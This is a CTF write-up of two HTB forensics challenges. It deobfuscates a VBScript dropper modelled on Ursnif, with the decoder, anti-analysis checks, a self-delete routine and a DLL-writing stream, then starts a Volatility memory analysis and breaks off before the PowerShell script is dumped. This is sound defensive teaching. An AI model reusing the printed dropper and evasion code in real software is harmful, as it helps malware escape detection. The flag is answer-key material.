---
layout: post
title: "HTB Cyber Apocalypse CTF: Precious Guidance & Reflection"
image: ''
date:   2022-05-19 00:00:00
tags:
- htb-cyber-apocalypse
- forensics
- memory-analysis
- volatility
- dfir
- malware-analysis
- vbscript
- dll
- dnspy
description: ''
categories:
published: true
comments: false
---

<img src="https://ctf.hackthebox.com/static/ca/cyber_apocalypse_2022_ca.jpg" style="width:60%;height:60%">

## Intro
Precious Guidance and Reflection were both 3-star rated forensics challenges in the HTB Cyber Apocalypse CTF, and although I didn't solve Reflection before the end of the CTF, I think they both warranted solutions. Neither was particularly long, but they were difficult to fully understand as each had their own kinks thrown into the challenge.

Precious Guidance involved malware analysis of `SatelliteGuidance.vbs`, which I later found out was based on the [Ursnif dropper](https://www.stormshield.com/news/ursnif-security-alert-stormshields-product-response/). I'll have to reevaluate my usual methodology of cleaning out anything I think is junk by using `echo` statements and some deductive reasoning to find out that it runs a .NET dll. I can use the function that writes and deletes the DLL to grab it, and then decompile with dnSpy to find the flag. 

Reflection involved some serious Volatility work in analyzing a memory dump from a machine. It's pretty easy to find out that a Powershell script was loaded into memory with `iex` to download and reflectively inject a DLL into a `notepad.exe` process, but locating the DLL is a little tougher. After dumping the memory of notepad, I'll reassemble the DLL, decompile, and find the flag in a powershell command.

* buh
{:toc}

## Precious Guidance
### Description
`Miyuki has come across what seems to be a suspicious process running on one of her spaceship's navigation systems. After investigating the origin of this process, it seems to have been initiated by a script called "SatelliteGuidance.vbs". Eventually, one of your engineers informs her that she found this file in the spaceship's Intergalactic Inbox and thought it was an interactive guide for the ship's satellite operations. She tried to run the file but nothing happened. You and Miyuki start analysing it and notice you don't understand its code... it is obfuscated! What could it be and who could be behind its creation? Use your skills to uncover the truth behind the obfuscation layers.`

### Initial Analysis
We can open up the zip file and see a single `SatelliteGuidance.vbs` file. I'll open it up with VS Code for some syntax highlighting, and we see the beast that we're going to deal with.

![asdf](https://an00brektn.github.io/img/htb-cyber-apocalypse-22/Pasted image 20220519132129.png)

This is ~700 lines long.

One of the major downsides to doing written solutions is that it's really hard to highlight the methodology, mistakes, backtracking, etc. related to malware analysis and reverse engineering. I spent a long time on this challenge because of how massive it was and things I only noticed later. So although the writeup is going to look very streamlined, it definitely was not easy to find the solution immediately.

With that out of the way, the first thing I notice as I walkthrough this file is the repeated use of `execute(polymerase(ARRAY));`

```vb
REM malnourished Collins mutate. earthen Punjabi typography sweetie spunky bisexual thyroid husbandmen spheroidal immortal, Schumacher wade upshot escarpment wither anorthic 

yCuXgtwQE=Array(n501,mM,v884,"...trim...",w,v884,Cc)
execute(polymerase(yCuXgtwQE)):

dQZdg=Array(n501,mM,v884,"...trim...",w,v884,Cc)
execute(polymerase(dQZdg)):' example template Creole. devolve mortar controller medal, flammable neither abuilding mystify senor comrade canticle interpret dollop 


oWuiS=Array(n501,mM,v884,"...trim...",w,v884,Cc)
execute(polymerase(oWuiS)):REM bogeyman rhodolite Bodleian trajectory. smelly endgame.  7730659 audit Huntley phosphor domesticate846 oneupmanship sorrel. shyly Enoch Simla 

const SQ = 141
```

The `execute()` function seems to be native to VBScript, but `polymerase()` is defined somewhere in the middle of the file. When I first looked at this, I completely forgot to scruntinize the `polymerase()` because I immediately jumped to printing out the output of the function, as opposed to trying to analyze it. 

```vb
Function polymerase(Iztv)
eHF201=1:GcoZG=9
' Stokes130 gunsling savant Cobb shag maze impassion strap fag131 apply procreate Gemini diocesan slog supposable698 hasten,

WNh = lbound(Iztv)
' Delilah collegian Hebrides Triangulum auxiliary omnivorous arpeggio Abel Triceratops extraneous Keynesian Leigh belie eventful Nikolai 
Iqe = ubound(Iztv)
for gmG = WNh to Iqe
Randomize
if Iztv(gmG) = 999999 Then
KkF = KkF & ChrW(Int((eHF201-GcoZG+1)*Rnd+GcoZG))
Else
KkF = KkF & ChrW(Iztv(gmG) - ((6842 - 6781.0) - (89 + (-(37 + (0.0))))))
REM rusk hiss Fallopian tray USPS Moloch sigma cardiology marksman swishy Elaine seventh skyline molecular oriole Garcia tableau cusp 
End if
' invalidate Hyde trap refuge phenotype import stain dram salvage metro Giovanni cage crossword raindrop grub behead aerie referred lever 
Next
polymerase = KkF
End Function
```

At this point, you might be wondering why these random words are strewn across the file. This is not some weird guessy CTF thing, it's actually a technique used by threat actors to manipulate the entropy of the file (i.e. how random a file looks) to make it seem much more normal. Typically, a higher entropy, from a forensics perspective, could indicate that a file is packed, or compressed, which can give us insights into the nature of the file. However, in this case, the words are likely used for evasion, against AV/EDR that might check for high entropys.

Coming back to the main point, the `polymerase` function, from a cursory glance, appears to iterate over the input object, likely an array, and then builds up a string (`KkF`) based on what's in the array. We'll come back to this in a little bit.

### Discovering Stage 2
Rather than execute the script, we can attempt to dump out the objects that are being made with `polymerase` and passed to `execute` by replacing all `execute` calls with `wscript.echo`, which is basically a print statement in VBScript. I can use Find and Replace to do this for me. Once we do that, we can run the script again and discover a second stage. 

```vb
C:\Users\sreisz\Desktop\precious_guidance
λ cscript SatelliteGuidance.vbs
Microsoft (R) Windows Script Host Version 5.812
Copyright (C) Microsoft Corporation. All rights reserved.

Function femoral()
REM Tulsa moron screenful loin fee mink potential indulge electress manage immigrate,
enamel("DEBUG: FS_FCC - Start")
on error resume next
Set qmxService = GetObject("winmgmts:\\.\root\cimv2")
Set coltish = qmxService.ExecQuery("Select * from Win32_Processor", , ((54 - (73 + (-67.0))) + ((52 + (-52.0)))))
For Each bremsstrahlung In coltish
If bremsstrahlung.NumberOfCores < ((38 + 575.0) - ((10 + 605.0) - 5.0)) Then
' fastidious Denmark important Verona Paulsen inequivalent Eva Algonquin acetate mailbox fortieth VA Nan certainty Koran
cabinetmake = True
REM Daley Congo Rensselaer below anthropocentric enough bobbin, polyphony thundershower. bastion colloquy breadth Fayetteville and764 drip, squirm thief tate
enamel("DEBUG: FS_FCC - False")
End If
REM splay Luther singleton stowaway hydrant crypto toe aerosol asymmetry m triploid spitfire.  2931158 special assent. crotchety Waring statuette builtin. hexameter un
Next
If cabinetmake Then
LgA
' Italian Berra directorate Borden absolve Dewitt Deneb mate Adlerian apprehend athletic bracket Banach. Ziegler
End If
enamel("DEBUG: FS_FCC - True")
REM sculpture gaslight Maureen well betoken slake.  5494325 cockle billy Clytemnestra heterozygous dose
End Function

' ...trim...
```

Once again, the file is too long to include in this writeup, but the short and simple of it is that a variety of functions are defined. More importantly, these are the names of the functions that are at the bottom of the original file.

```
femoral
Kim
RKKOG
MWKz
LBUd
RCtu
hTGtM
zWY
DRYX
pooch
serenade
```

### Stage 2 Function Analysis
I got caught in limbo here, struggling to really unpack everything that was going on. There are a lot of functions, a few of which are intended to just exit the program or delete the file, but I'll give a brief synopsis of what each one does here.

- `femoral` - Seems to be some kind of anti-sandbox function that checks the number of cores on the system
- `Kim` - Some kind of time of day check, likely to stop debugger-based analysis
- `RKKOG` - Checking the amount of RAM, again, another anti-sandbox technique
- `MWKz` - Checking the Downloads folder for a specific file, `76795.txt` (found using Procmon), just more anti-analysis.
- `LBUd` - Checking for a bunch of processes like `frida.exe` or `python.exe` which can be used for analysis purposes
- `RCtu` - Checking Disk size, yes, that's right, more anti-analysis
- `hTGtM` - Literally just a bait error message that sleeps for a while. This doesn't do anything.
- `zWY` - Sleep function to bypass EDR
- `DRYX` - Creates an `adobe.url` shortcut in a temporary directory. This might just be another whole anti-analysis technique to check for internet connection, but it barely seemed to be used.
- `pooch` - Writes the `textual.m3u` file using an "Adob.stream"(?)
- `serenade` - Runs the `textual.m3u` (definitely a dll) with `rundll32`. There's something else with `calc.exe` in a conditional statment, but it might be more anti-analysis

A `coherent` function was also called by many of these to try and delete the file.
```vb
Function coherent()
Dim tercel: Set tercel = WScript.CreateObject("Scripting.FileSystemObject")
tercel.DeleteFile WScript.ScriptFullName, True
End Function
```

There was also a `SECRET` that used the `polymerase` function, but my attempts to get it to work as is only resulted in errors for a while.
```vb
SECRET=Array(Cc,y334,Wl,"...trim...")
.WriteText polymerase(SECRET)
```

### Understanding polymerase()
So clearly, there's a lot of anti-analysis going on, which is very typical of a threat actor who has higher skill TTPs. However, since this malware is scripted, it's a lot easier to choose what we want to execute. Now that we have a much better understanding of what these functions are doing, I really want to get to the bottom of this `polymerase()` function. I'll copy the SECRET stuff and `polymerase` out to another file and see what I get back when I `echo`.
```vb
Function polymerase(Iztv)
eHF201=1:GcoZG=9
' Stokes130 gunsling savant Cobb shag maze impassion strap fag131 apply procreate Gemini diocesan slog supposable698 hasten, 

WNh = lbound(Iztv)
' Delilah collegian Hebrides Triangulum auxiliary omnivorous arpeggio Abel Triceratops extraneous Keynesian Leigh belie eventful Nikolai 
Iqe = ubound(Iztv)
for gmG = WNh to Iqe
Randomize
if Iztv(gmG) = 999999 Then
KkF = KkF & ChrW(Int((eHF201-GcoZG+1)*Rnd+GcoZG))
Else
KkF = KkF & ChrW(Iztv(gmG) - ((6842 - 6781.0) - (89 + (-(37 + (0.0))))))
REM rusk hiss Fallopian tray USPS Moloch sigma cardiology marksman swishy Elaine seventh skyline molecular oriole Garcia tableau cusp 
End if
' invalidate Hyde trap refuge phenotype import stain dram salvage metro Giovanni cage crossword raindrop grub behead aerie referred lever 
Next
polymerase = KkF
End Function

SECRET=Array(Cc,y334,Wl,"...trim...",py,py,py)
wscript.echo polymerase(SECRET)
```

Running it, we get nothing back.
```shell
C:\Users\sreisz\Desktop\precious_guidance
λ cscript test.vbs
Microsoft (R) Windows Script Host Version 5.812
Copyright (C) Microsoft Corporation. All rights reserved.

????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
```

However, if I append this to the end of the original script, we get some lore.
```vb
'...trim...
'femoral
'Kim
'RKKOG
'MWKz
'LBUd
'RCtu
'hTGtM
'zWY
'DRYX
'pooch
'serenade
SECRET=Array(Cc,y334,Wl,"...trim...")
wscript.echo SECRET
```
```
C:\Users\sreisz\Desktop\precious_guidance
λ cscript SatelliteGuidance.vbs
...trim...
Dearest Miyuki,

If you are reading this message, it means that unfortunate events have led to our untimely death. Since Draeger's leadership, we have feared that a day might come when something horrible happens to us. For that reason, we wrote this obfuscated malware to be spawned automatically on the day of the Fifth Andromeda Alignment. We hoped it would spread via Intergalactic Communications and reach you one day. Having observed and admired your investigative skills since you started your training, we knew that you were the only one with the mindset, patience, and persistence required to receive this highly valuable message. We have been progressing a highly detailed map of Outer-galactic pathways for ultra-speed travel, a project initiated by your ancestors eons ago. These passages are hidden and unknown to anyone besides few of our trusted family and allies. All your life you have been destined to receive the key to this knowledge, and since we are not there to give it to you, this is our way of doing so. Dive deeper one more time, to retrieve the final key to this database. Whatever difficulties you face, we have always been proud and believe in you.

All our love,
Your Parents and Guardians.
```

1. Rip Miyuki's parents. Weird way to communicate that but go off.
2. All of those random arrays throughout the script must actually come together to encode data!

### Grabbing the Flag
The functions that we discussed earlier simply do a bunch of anti-analysis techniques and then run a DLL that is written to disk (and removed) using the `polymerase` function. If we can write that DLL to disk, we can maybe analyze it further and understand what the ultimate goal of this malware is. I'm going to modify the `hNZCG` function to write the dll to our current directory, and bypass all of the anti-analysis functions.

```vb
Function polymerase(Iztv)
eHF201=1:GcoZG=9
' Stokes130 gunsling savant Cobb shag maze impassion strap fag131 apply procreate Gemini diocesan slog supposable698 hasten, 

WNh = lbound(Iztv)
' Delilah collegian Hebrides Triangulum auxiliary omnivorous arpeggio Abel Triceratops extraneous Keynesian Leigh belie eventful Nikolai 
Iqe = ubound(Iztv)
for gmG = WNh to Iqe
Randomize
if Iztv(gmG) = 999999 Then
KkF = KkF & ChrW(Int((eHF201-GcoZG+1)*Rnd+GcoZG))
Else
KkF = KkF & ChrW(Iztv(gmG) - ((6842 - 6781.0) - (89 + (-(37 + (0.0))))))
REM rusk hiss Fallopian tray USPS Moloch sigma cardiology marksman swishy Elaine seventh skyline molecular oriole Garcia tableau cusp 
End if
' invalidate Hyde trap refuge phenotype import stain dram salvage metro Giovanni cage crossword raindrop grub behead aerie referred lever 
Next
polymerase = KkF
End Function

Dim Creon:Set Creon = CreateObject("ADO"+"DB.S"+"tr"+"eam")
With Creon
.Type = 2
.Charset = "ISO-8859-1"
.Open()
' astatine,  1470074 hydronium181 Hoover controversial sportswear wander277 inertia homeland homotopy pegging rural pyrotechnic rum had cartilage derivate pothole 
'For Each HCZ in 
HCZ=Array(Rk,xZ,Et,"...trim...",9,9,9,9)
.WriteText polymerase(HCZ)
REM foxhole antiquated ester Byronic. Bunyan plentiful modular demerit baldy grimace coup Nicodemus trigonometry chokeberry superfluous 
'Next
.Position = 0
.SaveToFile ".\textual.m3u.dll", 2 :'.SaveToFile hNZCG + "textual.m3u", 2
REM snotty Chantilly laughingstock caiman Douglas heavy,  1493934 monitory hysteresis,  4255886 arsenide Bryant Grecian, baseband sixfold,  1631541 retroactive Afghanistan cleanup. slid abbey, archbishop pyrolyse gules 
.Close
End With
```

If I run this file, we get all ofthe output of our previous runs (because I didn't really clean those up), but we get a new file.
```shell
C:\Users\sreisz\Desktop\precious_guidance
λ cscript experiment.vbs
# ...trim...
C:\Users\sreisz\Desktop\precious_guidance
λ ls -la textual.m3u.dll
-rw-rw-rw-   1 user     group        8192 May 19 13:55 textual.m3u.dll

C:\Users\sreisz\Desktop\precious_guidance
λ file textual.m3u.dll
textual.m3u.dll: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
```

Since the DLL is a .NET assembly, we can use [dnSpy](https://github.com/dnSpyEx/dnSpy) to decompile it, and we find that it is a backdoor. We also find that the file was originally was compiled as `intcomm.dll`.

![asdf](https://an00brektn.github.io/img/htb-cyber-apocalypse-22/Pasted image 20220519155934.png)
Notice that the password is built as what seems to be a hexstring. If we decode it using CyberChef (or your preferred method of unhex-ing data), we get the flag.

```shell
$ echo -e "4854427b54724176456c5f47754964416e63455f41667445725f4c6966457d" | xxd -r -p; echo
HTB{TrAvEl_GuIdAncE_AftEr_LifE}
```

Flag: `HTB{TrAvEl_GuIdAncE_AftEr_LifE}`

## Reflection
### Description
`You and Miyuki have succeeded in dis-empowering Draeger's army in every possible way. Stopped their fuel-supply plan, arrested their ransomware gang, prevented massive phishing campaigns and understood their tactics and techniques in depth. Now it is the time for the final blow. The final preparations are completed. Everyone is in their stations waiting for the signal. This mission can only be successful if you use the element of surprise. Thus, the signal must remain a secret until the end of the operation. During some last-minute checks you notice some weird behaviour in Miyuki's PC. You must find out if someone managed to gain access to her PC before it's too late. If so, the signal must change. Time is limited and there is no room for errors. Download: http://134.209.177.115/forensics/forensics_reflection.zip`

### Initial Analysis
Unzipping the folder, we see one *very* large `memory.raw` file, which is very clearly a memory dump of the image. I've already showcased the basics of Volatility, the de facto open source tool for memory analysis doing [HTB Cyber Santa CTF](https://an00brektn.github.io/htb-santa-persist/), so you can go read that if you're not familiar with the tool.

The most important thing, that I've found, doing memory forensics and just DFIR as a whole, is that you need to be aware of what you know, and what you want to know (I'm pretty sure I stole this from 0xdf but it's true). The inherent difficulty with memory forensics is being limited in what you can see, and figuring out how to piece those things together to assemble a timeline and idea of what TTPs might be at play, what might have been compromised, and to what extent. Lecturing aside, let's do some initial checks.

> I also recently discovered [carlospolop](https://twitter.com/carlospolopm)'s [autoVolatility](https://github.com/carlospolop/autoVolatility) script which can help automate the process in the sense that you run a lot of plugins and save the output. It's kind of like the [AutoRecon](https://github.com/Tib3rius/AutoRecon) of memory forensics where it's not great with context, but it can help save some time.

We always want to start off with an `imageinfo` scan (or alternatively, `kdbgscan` if you really want to get it right).
```shell
remnux@remnux:~/ctf/cyber-apocalypse/forensics_reflection/autoVolatility$ vol.py -f memory.raw imageinfo
Volatility Foundation Volatility Framework 2.6.1
/usr/local/lib/python2.7/dist-packages/volatility/plugins/community/YingLi/ssh_agent_key.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography.hazmat.backends.openssl import backend
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86
                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/remnux/ctf/cyber-apocalypse/forensics_reflection/autoVolatility/memory.raw)
                      PAE type : PAE
                           DTB : 0x185000L
                          KDBG : 0x82947c68L
          Number of Processors : 1
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0x82948d00L
             KUSER_SHARED_DATA : 0xffdf0000L
           Image date and time : 2022-04-20 11:06:10 UTC+0000
     Image local date and time : 2022-04-20 04:06:10 -0700
```

The first profile suggested is usually the right one to go with. From there, I like to run various `ps*` scans, like `psscan` and `pstree`, to identify processes, and also `netscan` to check for any anomalous network activity. 

```shell
remnux@remnux:~/ctf/cyber-apocalypse/forensics_reflection/autoVolatility$ vol.py -f memory.raw --profile=Win7SP1x86_23418 pstree
Volatility Foundation Volatility Framework 2.6.1
Name                                                  Pid   PPid   Thds   Hnds Time
-------------------------------------------------- ------ ------ ------ ------ ----
 0x8595d8d8:explorer.exe                             1280   1256     31    662 2022-04-20 11:05:18 UTC+0000
. 0x859b77c8:VBoxTray.exe                            1464   1280     17    150 2022-04-20 11:05:18 UTC+0000
 0x8569c2d8:csrss.exe                                 312    304      8    492 2022-04-20 11:05:15 UTC+0000
. 0x858c6d28:conhost.exe                              520    312      2     32 2022-04-20 11:05:19 UTC+0000
 0x85074110:wininit.exe                               352    304      7     90 2022-04-20 11:05:15 UTC+0000
. 0x8583a030:services.exe                             456    352     31    277 2022-04-20 11:05:16 UTC+0000
.. 0x8587e3e0:VBoxService.ex                          640    456     14    127 2022-04-20 11:05:17 UTC+0000
.. 0x858ddd28:svchost.exe                             904    456     42    842 2022-04-20 11:05:17 UTC+0000
.. 0x841d1bc0:cygrunsrv.exe                          1880    456      7    107 2022-04-20 11:05:19 UTC+0000
... 0x858db030:cygrunsrv.exe                          348   1880      0 ------ 2022-04-20 11:05:19 UTC+0000
.... 0x858c0b58:sshd.exe                              468    348      6    105 2022-04-20 11:05:19 UTC+0000
.. 0x8fdda8d8:svchost.exe                             276    456      6     96 2022-04-20 11:05:20 UTC+0000
.. 0x85aa1a70:wlms.exe                               1944    456      5     47 2022-04-20 11:05:19 UTC+0000
.. 0x85a1f030:vmicsvc.exe                            1692    456      5     68 2022-04-20 11:05:18 UTC+0000
.. 0x8597a838:spoolsv.exe                            1324    456     15    299 2022-04-20 11:05:18 UTC+0000
.. 0x86427d28:svchost.exe                             696    456     10    262 2022-04-20 11:05:17 UTC+0000
.. 0x85a178d8:vmicsvc.exe                            1664    456      9    114 2022-04-20 11:05:18 UTC+0000
.. 0x85a23d28:vmicsvc.exe                            1728    456      7     82 2022-04-20 11:05:18 UTC+0000
.. 0x85a2e678:svchost.exe                            1792    456     15    293 2022-04-20 11:05:18 UTC+0000
.. 0x85846470:svchost.exe                             576    456     15    369 2022-04-20 11:05:17 UTC+0000
... 0x84f16a30:dllhost.exe                           3796    576      6     88 2022-04-20 11:06:11 UTC+0000
.. 0x85493d28:svchost.exe                             864    456     24    472 2022-04-20 11:05:17 UTC+0000
... 0x85956b48:dwm.exe                               1264    864      6     87 2022-04-20 11:05:18 UTC+0000
... 0x85c178d8:dwm.exe                               2668    864      6     86 2022-04-20 11:05:35 UTC+0000
.. 0x8590dd28:svchost.exe                            1108    456     22    373 2022-04-20 11:05:17 UTC+0000
.. 0x85a296b0:vmicsvc.exe                            1756    456      7     83 2022-04-20 11:05:18 UTC+0000
.. 0x85a0aa70:vmicsvc.exe                            1644    456      8    105 2022-04-20 11:05:18 UTC+0000
.. 0x85fd2030:SearchIndexer.                         2148    456     17    686 2022-04-20 11:05:23 UTC+0000
... 0x850a41e8:SearchProtocol                        2228   2148      8    258 2022-04-20 11:05:24 UTC+0000
... 0x850cc8d8:SearchFilterHo                        2252   2148      6     81 2022-04-20 11:05:24 UTC+0000
... 0x865c91a8:SearchProtocol                        2288   2148      8    235 2022-04-20 11:05:24 UTC+0000
.. 0x85c059b8:taskhost.exe                           2616    456     10    155 2022-04-20 11:05:35 UTC+0000
.. 0x85994030:taskhost.exe                           1384    456     10    155 2022-04-20 11:05:18 UTC+0000
.. 0x922f8b00:svchost.exe                             748    456     19    371 2022-04-20 11:05:17 UTC+0000
.. 0x859956f0:svchost.exe                            1392    456     25    327 2022-04-20 11:05:18 UTC+0000
.. 0x84a644f8:sppsvc.exe                             1140    456      6    151 2022-04-20 11:05:20 UTC+0000
.. 0x858fca08:svchost.exe                            1016    456     21    349 2022-04-20 11:05:17 UTC+0000
. 0x8583eb00:lsass.exe                                464    352      9    651 2022-04-20 11:05:16 UTC+0000
. 0x8583f540:lsm.exe                                  472    352     12    188 2022-04-20 11:05:16 UTC+0000
 0x8413a940:System                                      4      0     75    518 2022-04-20 11:05:14 UTC+0000
. 0x861b0588:smss.exe                                 236      4      4     32 2022-04-20 11:05:14 UTC+0000
 0x854e2160:csrss.exe                                 364    344      7    176 2022-04-20 11:05:15 UTC+0000
 0x84fca380:winlogon.exe                              412    344      6    121 2022-04-20 11:05:16 UTC+0000
 0x85b2dad8:winlogon.exe                             2468   2428      6    124 2022-04-20 11:05:31 UTC+0000
 0x841d4c60:csrss.exe                                2440   2428      9    239 2022-04-20 11:05:31 UTC+0000
. 0x84b1e030:conhost.exe                             3768   2440      2     50 2022-04-20 11:06:08 UTC+0000
. 0x84ac6d28:conhost.exe                             3432   2440      2     51 2022-04-20 11:05:48 UTC+0000
 0x85c18560:explorer.exe                             2680   2648     37    771 2022-04-20 11:05:35 UTC+0000
. 0x85bf4d28:notepad.exe                             3244   2680      2     57 2022-04-20 11:05:41 UTC+0000
. 0x84b5dd28:DumpIt.exe                              3756   2680      2     37 2022-04-20 11:06:08 UTC+0000
. 0x8594e488:powershell.exe                          3424   2680     13    507 2022-04-20 11:05:48 UTC+0000
. 0x85c407a8:VBoxTray.exe                            2800   2680     17    147 2022-04-20 11:05:35 UTC+0000
```
```shell
remnux@remnux:~/ctf/cyber-apocalypse/forensics_reflection/autoVolatility$ vol.py -f memory.raw --profile=Win7SP1x86_23418 netscan
Volatility Foundation Volatility Framework 2.6.1
Offset(P)          Proto    Local Address                  Foreign Address      State            Pid      Owner          Created
0x22b362f0         UDPv4    10.0.2.15:137                  *:*                                   4        System         2022-04-20 11:05:21 UTC+0000
0x22cdadf0         UDPv6    fe80::256b:4013:4140:453f:546  *:*                                   748      svchost.exe    2022-04-20 11:05:28 UTC+0000
0x229d7eb8         TCPv4    0.0.0.0:49155                  0.0.0.0:0            LISTENING        456      services.exe   
0x3da27928         TCPv4    0.0.0.0:135                    0.0.0.0:0            LISTENING        696      svchost.exe    
0x3da27928         TCPv6    :::135                         :::0                 LISTENING        696      svchost.exe    
0x3dbe9f60         TCPv4    0.0.0.0:445                    0.0.0.0:0            LISTENING        4        System         
0x3dbe9f60         TCPv6    :::445                         :::0                 LISTENING        4        System         
0x3e211c78         UDPv4    0.0.0.0:0                      *:*                                   3424     powershell.exe 2022-04-20 11:06:04 UTC+0000
0x3e2123f8         UDPv4    0.0.0.0:0                      *:*                                   3424     powershell.exe 2022-04-20 11:06:04 UTC+0000
0x3e2123f8         UDPv6    :::0                           *:*                                   3424     powershell.exe 2022-04-20 11:06:04 UTC+0000
0x3e4d1820         UDPv4    0.0.0.0:0                      *:*                                   276      svchost.exe    2022-04-20 11:05:21 UTC+0000
0x3e547850         UDPv4    0.0.0.0:0                      *:*                                   276      svchost.exe    2022-04-20 11:05:21 UTC+0000
0x3e547850         UDPv6    :::0                           *:*                                   276      svchost.exe    2022-04-20 11:05:21 UTC+0000
0x3e549178         UDPv4    0.0.0.0:0                      *:*                                   1108     svchost.exe    2022-04-20 11:05:21 UTC+0000
0x3e549178         UDPv6    :::0                           *:*                                   1108     svchost.exe    2022-04-20 11:05:21 UTC+0000
0x3e5529c8         UDPv4    0.0.0.0:5355                   *:*                                   1108     svchost.exe    2022-04-20 11:05:24 UTC+0000
0x3e735a70         UDPv4    0.0.0.0:5355                   *:*                                   1108     svchost.exe    2022-04-20 11:05:24 UTC+0000
0x3e735a70         UDPv6    :::5355                        *:*                                   1108     svchost.exe    2022-04-20 11:05:24 UTC+0000
0x3e5241a0         TCPv4    0.0.0.0:49156                  0.0.0.0:0            LISTENING        464      lsass.exe      
0x3e52b1b0         TCPv4    10.0.2.15:139                  0.0.0.0:0            LISTENING        4        System         
0x3e655b50         TCPv4    0.0.0.0:49153                  0.0.0.0:0            LISTENING        748      svchost.exe    
0x3e655b50         TCPv6    :::49153                       :::0                 LISTENING        748      svchost.exe    
0x3e661ed0         TCPv4    0.0.0.0:49153                  0.0.0.0:0            LISTENING        748      svchost.exe    
0x3e693478         TCPv4    0.0.0.0:135                    0.0.0.0:0            LISTENING        696      svchost.exe    
0x3e6a3a30         TCPv4    0.0.0.0:49152                  0.0.0.0:0            LISTENING        352      wininit.exe    
0x3e6a3a30         TCPv6    :::49152                       :::0                 LISTENING        352      wininit.exe    
0x3e6a6a88         TCPv4    0.0.0.0:49152                  0.0.0.0:0            LISTENING        352      wininit.exe    
0x3e6c5a30         TCPv4    0.0.0.0:22                     0.0.0.0:0            LISTENING        468      sshd.exe       
0x3e6c5a30         TCPv6    :::22                          :::0                 LISTENING        468      sshd.exe       
0x3e766780         TCPv4    0.0.0.0:49154                  0.0.0.0:0            LISTENING        904      svchost.exe    
0x3e766780         TCPv6    :::49154                       :::0                 LISTENING        904      svchost.exe    
0x3e7713f8         TCPv4    0.0.0.0:49154                  0.0.0.0:0            LISTENING        904      svchost.exe    
0x3e5679b8         TCPv4    10.0.2.15:49160                65.55.44.109:443     ESTABLISHED      -1                      
0x3edf3e98         UDPv4    10.0.2.15:138                  *:*                                   4        System         2022-04-20 11:05:21 UTC+0000
0x3eea7d98         TCPv4    0.0.0.0:49156                  0.0.0.0:0            LISTENING        464      lsass.exe      
0x3eea7d98         TCPv6    :::49156                       :::0                 LISTENING        464      lsass.exe      
0x3f0ebeb8         TCPv4    0.0.0.0:49155                  0.0.0.0:0            LISTENING        456      services.exe   
0x3f0ebeb8         TCPv6    :::49155                       :::0                 LISTENING        456      services.exe   
0x3eea5710         TCPv4    10.0.2.15:49161                172.67.177.22:443    ESTABLISHED      -1                      
0x3f4f2ca8         UDPv4    0.0.0.0:0                      *:*                                   3424     powershell.exe 2022-04-20 11:06:02 UTC+0000
0x3f4fe008         UDPv4    0.0.0.0:0                      *:*                                   3424     powershell.exe 2022-04-20 11:06:02 UTC+0000
0x3f4fe008         UDPv6    :::0                           *:*                                   3424     powershell.exe 2022-04-20 11:06:02 UTC+0000
0x3f465b30         TCPv4    0.0.0.0:22                     0.0.0.0:0            LISTENING        468      sshd.exe 
```
Normally I truncate the outputs of these, but I thought it would be helpful to see the whole thing to get a better understanding of methodology. The currently running process seem very typical of a normal Windows system. By that, I mean, there are no processes named something like  `svchost.exe` or `lsass.exe` that are originating from processes other than those created by the operating system, there are no connections to weird IP addresses that are abnormal for a Windows machine, etc. Understanding what the machine normally looks like, and should look like, is key for investigative forensics. 
Malware authors and threat actors will frequently try and blend in by hiding in plainsight. Maybe their Meterpreter shell is called `svchost.exe` to try and get you to glance over it, even though it has a weird parent PID. Maybe there's some port open like 8443, which is normally used as an alternate HTTPS socket, but you realize the machine isn't a webserver.
In our case, it's not really a case of hiding in plain sight, we mostly have to focus on the `powershell.exe` (PID 3424) and `notepad.exe` (PID 3244) as these are two processes that don't have to be there, but aren't immediately malicious.

### Identifying "The Bad"
Volatility has a couple of plugins to help us recover information from Powershell and Notepad. The `notepad` plugin can be used to show what information might be stored in active notepad processes, but in this case, we don't get anything back. Keep this in the back of your mind though.
We can use the `consoles` and `cmdline` plugins to return the output of anything that was in a terminal, and what command line arguments were run, respectively. Specifically honing in on stuff related to our processes of interest, we see the following:
```shell
remnux@remnux:~/ctf/cyber-apocalypse/forensics_reflection/autoVolatility$ vol.py -f memory.raw --profile=Win7SP1x86_23418 consoles | grep -A 12 powershell
Volatility Foundation Volatility Framework 2.6.1
/usr/local/lib/python2.7/dist-packages/volatility/plugins/community/YingLi/ssh_agent_key.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography.hazmat.backends.openssl import backend
AttachedProcess: powershell.exe Pid: 3424 Handle: 0x5c
----
CommandHistory: 0x266520 Application: powershell.exe Flags: Allocated, Reset
CommandCount: 1 LastAdded: 0 LastDisplayed: 0
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x5c
Cmd #0 at 0x26a7b0: C:\Windows\security\update.ps1
----
Screen 0x246898 X:120 Y:3000
Dump:
Windows PowerShell                                                                                                      
Copyright (C) 2009 Microsoft Corporation. All rights reserved.                                                          
                                                                                                                        
PS C:\Users\Miyuki> C:\Windows\security\update.ps1                                                                      
**************************************************
```

It appears that Miyuki might have run a Powershell script called `update.ps1`. We can try to locate this file if it's on disk using the `filescan` plugin. We can then take the offset that is returned to dump the file out to our machine. It won't always look perfect, but it's usually legible.

```shell
